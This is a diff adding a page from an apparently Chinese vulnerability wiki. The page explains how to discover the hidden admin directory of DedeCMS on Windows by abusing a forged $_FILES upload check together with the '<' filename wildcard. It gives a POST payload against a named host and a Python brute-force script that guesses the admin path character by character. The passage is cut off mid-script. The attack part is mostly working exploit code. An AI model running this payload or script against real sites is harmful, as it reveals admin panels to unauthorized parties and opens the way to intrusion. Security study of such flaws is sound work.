@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Dedecms找后台 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Dedecms\u627e\u540e\u53f0", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-20129）Dedecms前台文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-link">
+        Dedecms swf文件反射型xss
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dedecms">Dedecms找后台<a class="headerlink" href="#dedecms" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>仅针对windows系统</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">代码分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>进入正题</p>
+<p>首先看核心文件common.inc.php 大概148行左右</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">require_once</span><span class="p">(</span><span class="n">DEDEINC</span><span class="o">.</span><span class="s1">&#39;/uploadsafe.inc.php&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>uploadsafe.inc.php</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;#^(cfg_|GLOBALS)#&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">_key</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Request var not allow for uploadsafe!&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">$$</span><span class="n">_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span><span class="w"> </span><span class="o">//</span><span class="err">获取</span><span class="n">temp_name</span><span class="w"> </span>
+<span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_name&#39;</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_type&#39;</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">preg_replace</span><span class="p">(</span><span class="s1">&#39;#[^0-9a-z\./]#i&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
+<span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_size&#39;</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">preg_replace</span><span class="p">(</span><span class="s1">&#39;#[^0-9]#&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="o">$</span><span class="n">_key</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_name&#39;</span><span class="p">})</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&quot;#\.(&quot;</span><span class="o">.$</span><span class="n">cfg_not_allowall</span><span class="o">.</span><span class="s2">&quot;)$#i&quot;</span><span class="p">,</span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_name&#39;</span><span class="p">})</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&quot;#\.#&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_name&#39;</span><span class="p">}))</span><span class="w"> </span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="s1">&#39;DEDEADMIN&#39;</span><span class="p">))</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Not Admin Upload filetype not allow !&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_size&#39;</span><span class="p">}))</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_size&#39;</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">@</span><span class="n">filesize</span><span class="p">(</span><span class="o">$$</span><span class="n">_key</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">$</span><span class="n">imtypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span>
+<span class="p">(</span>
+<span class="w">    </span><span class="s2">&quot;image/pjpeg&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;image/jpeg&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;image/gif&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;image/png&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">    </span><span class="s2">&quot;image/xpng&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;image/wbmp&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;image/bmp&quot;</span>
+<span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="n">in_array</span><span class="p">(</span><span class="n">strtolower</span><span class="p">(</span><span class="n">trim</span><span class="p">(</span><span class="o">$</span><span class="p">{</span><span class="o">$</span><span class="n">_key</span><span class="o">.</span><span class="s1">&#39;_type&#39;</span><span class="p">})),</span><span class="w"> </span><span class="o">$</span><span class="n">imtypes</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">image_dd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">@</span><span class="n">getimagesize</span><span class="p">(</span><span class="o">$$</span><span class="n">_key</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="o">//</span><span class="err">问题就在这里，获取文件的</span><span class="n">size</span><span class="err">，获取不到说明不是图片或者图片不存在，不存就</span><span class="n">exit</span><span class="w"> </span><span class="n">upload</span><span class="o">....</span><span class="w"> </span><span class="p">,</span><span class="err">利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">image_dd</span><span class="p">))</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Upload filetype not allow !&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+</code></pre></div>
+
+<p>注意$$_key这一句，变量$key取自于$_FILE，由于$<em>FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg</em>|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p>
+<p>本人出发点是找个可以利用\&lt;\&lt;通配符猜解后台目录，所以只要$$_key参数可控就可以达到目的。</p>
+<p>但在这之前有个if(!defined(\'DEDEADMIN\'))的判断,这个很好绕过设置tmp_name为0或者1.jpg含.
+就可以绕过。</p>
+<p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p>
+<p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype
+not allow !</p>
+<p>举个例子</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// ./dedecms/favicon.ico</span>
+<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;poc&#39;</span><span class="p">])){</span>
+    <span class="k">echo</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nx">get</span><span class="o">:</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost/test.php?poc=./d&lt;/favicon.ico</span>
+<span class="nx">返回</span><span class="err">：</span><span class="mf">1</span>
+
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost/test.php?poc=./a&lt;/favicon.ico</span>
+<span class="nx">返回</span><span class="err">：</span><span class="mf">0</span>
+
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost/test.php?poc=./de&lt;/favicon.ico</span>
+<span class="nx">返回</span><span class="err">：</span><span class="mf">1</span>
+
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost/test.php?poc=./ded&lt;/favicon.ico</span>
+<span class="nx">返回</span><span class="err">：</span><span class="mf">1</span>
+
+<span class="p">........</span>
+</code></pre></div>
+
+<h3 id="_5">复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>构造poc</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">tags</span><span class="p">.</span><span class="n">php</span>
+
+<span class="nl">post</span><span class="p">:</span>
+
+<span class="n">dopost</span><span class="o">=</span><span class="k">save</span><span class="o">&amp;</span><span class="n">_FILES</span><span class="o">[</span><span class="n">b4dboy</span><span class="o">][</span><span class="n">tmp_name</span><span class="o">]=</span><span class="p">.</span><span class="o">/</span><span class="n">de</span><span class="o">&lt;/</span><span class="n">images</span><span class="o">/</span><span class="n">admin_top_logo</span><span class="p">.</span><span class="n">gif</span><span class="o">&amp;</span><span class="n">_FILES</span><span class="o">[</span><span class="n">b4dboy</span><span class="o">][</span><span class="n">name</span><span class="o">]=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">_FILES</span><span class="o">[</span><span class="n">b4dboy</span><span class="o">][</span><span class="n">size</span><span class="o">]=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">_FILES</span><span class="o">[</span><span class="n">b4dboy</span><span class="o">][</span><span class="n">type</span><span class="o">]=</span><span class="nc">image</span><span class="o">/</span><span class="n">gif</span>
+</code></pre></div>
+
+<p>Common.inc.php
+是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p>
+<p>当目录存在点时候</p>
+<p><img alt="" src="../resource/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/media/rId26.png" /></p>
+<p>当目录不存在点时候</p>
+<h3 id="python">python脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#coding:utf-8</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">random</span><span class="w"> </span><span class="kn">import</span> <span class="n">choice</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">characters</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-&quot;</span>
+<span class="n">back_dir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+<span class="n">show_message</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">check_message</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">valid_file</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span> <span class="p">:</span> <span class="s2">&quot;./../</span><span class="si">{p}</span><span class="s2">&lt;&lt;/images/adminico.gif&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;_FILES[tools][name]&quot;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="s2">&quot;_FILES[tools][size]&quot;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="s2">&quot;_FILES[tools][type]&quot;</span> <span class="p">:</span> <span class="s2">&quot;image/gif&quot;</span>
+<span class="p">}</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+
+                        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span><span class="s2">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;Accept&quot;</span><span class="p">:</span><span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;Accept-Language&quot;</span><span class="p">:</span><span class="s2">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;Connection&quot;</span><span class="p">:</span><span class="s2">&quot;Close&quot;</span>
+<span class="p">}</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">Bute_Login</span><span class="p">:</span>
+        <span class="k">global</span> <span class="n">headers</span>
+        <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">target</span><span class="p">):</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target</span>
+
+        <span class="k">def</span><span class="w"> </span><span class="nf">Check</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+                <span class="k">global</span> <span class="n">data</span><span class="p">,</span><span class="n">check_message</span><span class="p">,</span><span class="n">valid_file</span>
+
+                <span class="n">File_Chek_List</span> <span class="o">=</span><span class="p">[</span><span class="s1">&#39;/tags.php&#39;</span><span class="p">,</span><span class="s1">&#39;/include/vdimgck.php&#39;</span><span class="p">,</span><span class="s1">&#39;/m/list.php&#39;</span><span class="p">,</span><span class="s1">&#39;/m/view.php&#39;</span><span class="p">,</span><span class="s1">&#39;/member/config.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/advancedsearch.php&#39;</span><span class="p">,</span>
+                                  <span class="s1">&#39;/plus/arcmulti.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/bookfeedback.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/bookfeedback_js.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/car.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/carbuyaction.php&#39;</span><span class="p">,</span>
+                                  <span class="s1">&#39;/plus/comments_frame.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/count.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/digg_ajax.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/digg_frame.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/digg_frame.php&#39;</span><span class="p">,</span>
+                                     <span class="s1">&#39;/plus/disdls.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/diy.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/download.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/erraddsave.php&#39;</span><span class="p">,</span>
+                                     <span class="s1">&#39;/plus/feedback.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/feedback_ajax.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/flink.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/flink.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/flink_add.php&#39;</span><span class="p">,</span>
+                                     <span class="s1">&#39;/plus/freelist.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/heightsearch.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/list.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/mytag_js.php&#39;</span><span class="p">,</span>
+                                     <span class="s1">&#39;/plus/posttocar.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/qrcode.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/recommend.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/rss.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/search.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/showphoto.php&#39;</span><span class="p">,</span>
+                                     <span class="s1">&#39;/plus/stow.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/view.php&#39;</span><span class="p">,</span><span class="s1">&#39;/plus/vote.php&#39;</span><span class="p">,</span><span class="s1">&#39;/special/index.php&#39;</span><span class="p">]</span>
+                <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">File_Chek_List</span><span class="p">:</span>
+                        <span class="k">try</span><span class="p">:</span>
+                                <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="o">+</span><span class="n">filename</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+                                <span class="c1">#print self.target+filename+&quot;---&gt;&quot;+res.text</span>
+                                <span class="k">if</span> <span class="s2">&quot;Upload filetype not allow !&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                                        <span class="n">valid_file</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+                        <span class="k">except</span><span class="p">:</span>
+                                <span class="k">pass</span>
+                <span class="c1">#print valid_file</span>
+                <span class="c1">#print valid_file</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">valid_file</span><span class="p">):</span>
+                        <span class="k">if</span> <span class="s2">&quot;/tags.php&quot;</span> <span class="ow">in</span> <span class="n">valid_file</span><span class="p">:</span>
+                                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">valid_file</span><span class="p">:</span>
+                                        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&quot;/tags.php&quot;</span><span class="p">:</span>
+                                                <span class="k">return</span> <span class="n">i</span>
+                        <span class="k">else</span><span class="p">:</span>
+                                <span class="n">file_name</span> <span class="o">=</span> <span class="n">choice</span><span class="p">(</span><span class="n">valid_file</span><span class="p">)</span>
+                                <span class="k">return</span> <span class="n">file_name</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="kc">False</span>
+
+        <span class="k">def</span><span class="w"> </span><span class="nf">Bute</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+                <span class="n">f_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">Check</span><span class="p">()</span>
+                <span class="c1">#print f_name</span>
+                <span class="k">if</span> <span class="n">f_name</span> <span class="o">!=</span> <span class="kc">False</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">f_name</span> <span class="o">==</span> <span class="s2">&quot;/tags.php&quot;</span><span class="p">:</span>
+                                <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span>
+                        <span class="k">else</span><span class="p">:</span>
+                                <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;./../&quot;</span>
+                        <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="k">global</span> <span class="n">characters</span><span class="p">,</span><span class="n">back_dir</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">check_message</span>
+                        <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">7</span><span class="p">):</span>        
+                                <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+                                        <span class="k">break</span>
+                                <span class="k">for</span> <span class="n">pre</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">characters</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
+                                        <span class="n">pre</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">pre</span><span class="p">))</span>
+                                        <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">pre</span><span class="p">)</span>
+                                        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;testing&quot;</span><span class="p">,</span><span class="n">pre</span><span class="p">)</span>
+                                        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="o">+</span><span class="n">f_name</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+                                        <span class="k">if</span> <span class="s2">&quot;Upload filetype not allow !&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                                                <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
+                                                <span class="n">back_dir</span> <span class="o">=</span> <span class="n">pre</span>
+                                                <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s{p}</span><span class="s2">&lt;&lt;/images/adminico.gif&quot;</span><span class="o">%</span><span class="n">prefix</span>
+                                                <span class="k">break</span>
+                                        <span class="k">else</span><span class="p">:</span>
+                                                <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s{p}</span><span class="s2">&lt;&lt;/images/adminico.gif&quot;</span><span class="o">%</span><span class="n">prefix</span>
+                        <span class="c1">#print(&quot;[+] 前缀为：&quot;,back_dir)</span>
+                        <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+                                <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+                                        <span class="k">break</span>
+                                <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+                                        <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="n">characters</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+                                                <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
+                                                <span class="k">break</span>
+                                        <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">back_dir</span><span class="o">+</span><span class="n">ch</span><span class="p">)</span>
+                                        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="o">+</span><span class="n">f_name</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+                                        <span class="k">if</span> <span class="s2">&quot;Upload filetype not allow !&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                                                <span class="n">back_dir</span> <span class="o">+=</span> <span class="n">ch</span>
